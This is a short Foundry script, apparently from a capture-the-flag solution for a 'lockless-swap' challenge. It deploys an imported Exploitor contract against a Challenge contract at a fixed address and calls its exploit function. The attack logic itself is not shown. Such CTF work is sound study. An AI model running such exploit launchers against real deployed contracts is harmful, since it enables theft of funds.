// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import "../src/lockless-swap/Challenge.sol";
import "../src/lockless-swap/Exploitor.sol";

contract ExploitScript is Script {
    function setUp() public {}

    function run() public {
        Challenge challenge = Challenge(
            address(0x289853e5199807E9FD228AA630D711a94A5E9CAd)
        );
        vm.startBroadcast();
        Exploitor exploitor = new Exploitor(challenge);
        exploitor.exploit();
        vm.stopBroadcast();
    }
}
